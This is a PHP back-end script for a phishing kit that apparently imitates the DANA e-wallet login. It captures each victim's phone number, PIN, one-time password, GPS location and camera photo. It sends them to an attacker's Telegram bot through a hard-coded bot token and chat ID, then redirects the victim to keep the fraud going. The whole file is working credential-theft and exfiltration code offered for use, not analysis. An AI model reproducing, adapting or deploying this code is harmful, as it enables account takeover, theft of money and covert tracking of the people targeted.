<?php
$step = $_POST['step'] ?? 0;
$phone = $_POST['phone'] ?? '';
$pin = $_POST['pin'] ?? '';
$otp = $_POST['otp'] ?? '';
$lat = $_POST['lat'] ?? '';
$lon = $_POST['lon'] ?? '';
$photo_b64 = $_POST['photo'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$waktu = date('d M Y, H:i:s');

$BOT_TOKEN = '8430507732:AAFmuY6LeC93coM1i93ORvgo4bKfQazhHMw';
$CHAT_ID = '8373436173';

function esc($t) {
    $chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($chars as $c) $t = str_replace($c, '\\' . $c, $t);
    return $t;
}

$geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
$city = $geo['city'] ?? 'Unknown';
$country = $geo['country'] ?? 'Unknown';
$maps_url = ($lat && $lon) ? "https://maps.google.com/?q=$lat,$lon" : "Tidak tersedia";

$step_label = $step == 1 ? '🔓 LOGIN CAPTURED' : '🔑 OTP CAPTURED';

$pesan  = "╔═════════════════════════════╗\n";
$pesan .= "║   💀 *BOT LYNXIEEx DANA* 💀   ║\n";
$pesan .= "╚═════════════════════════════╝\n\n";
$pesan .= "⚡ *STATUS:* `" . $step_label . "`\n";
$pesan .= "🕒 *WAKTU:* `" . esc($waktu) . "`\n\n";
$pesan .= "┏━━━ 🎯 *TARGET CREDENTIALS* ━━━\n";
$pesan .= "┃ 📞 *Nomor HP* : `" . esc($phone) . "`\n";
if ($pin) $pesan .= "┃ 🔐 *PIN* : `" . esc($pin) . "`\n";
if ($otp) $pesan .= "┃ 🔑 *OTP* : `" . esc($otp) . "`\n";
$pesan .= "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
$pesan .= "┏━━━ 🌐 *NETWORK & DEVICE* ━━━\n";
$pesan .= "┃ 🌍 *IP Addr* : `" . esc($ip) . "`\n";
$pesan .= "┃ 🗺️ *Lokasi IP* : " . esc($city) . ", " . esc($country) . "\n";
$pesan .= "┃ 📍 *Koordinat GPS* : `" . esc($lat) . ", " . esc($lon) . "`\n";
$pesan .= "┃ 🔗 *Google Maps* : [Buka Peta](" . $maps_url . ")\n";
$pesan .= "┃ 📱 *Device* : " . esc(substr($ua, 0, 40)) . "\n";
$pesan .= "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
$pesan .= "🛡️ _Sistem Pelacak Otomatis LYNXIEEx_\n";

// Kirim Pesan Teks
$url = "https://api.telegram.org/bot" . $BOT_TOKEN . "/sendMessage";
$post = ['chat_id' => $CHAT_ID, 'text' => $pesan, 'parse_mode' => 'MarkdownV2'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Kirim Foto
if (!empty($photo_b64) && strpos($photo_b64, 'data:image') !== false) {
    list($type, $data) = explode(';', $photo_b64);
    list(, $data)      = explode(',', $data);
    $data = base64_decode($data);
    
    $temp_file = tempnam(sys_get_temp_dir(), 'cam_') . '.jpg';
    file_put_contents($temp_file, $data);
    
    $url_photo = "https://api.telegram.org/bot" . $BOT_TOKEN . "/sendPhoto";
    $post_photo = [
        'chat_id' => $CHAT_ID,
        'photo' => new CURLFile($temp_file),
        'caption' => "📸 Foto Target: " . $phone
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url_photo);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_photo);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    unlink($temp_file);
}

// Redirect
if ($step == 1) {
    header('Location: /otp?phone=' . urlencode($phone));
} else {
    header('Location: /dashboard');
}
exit;
?>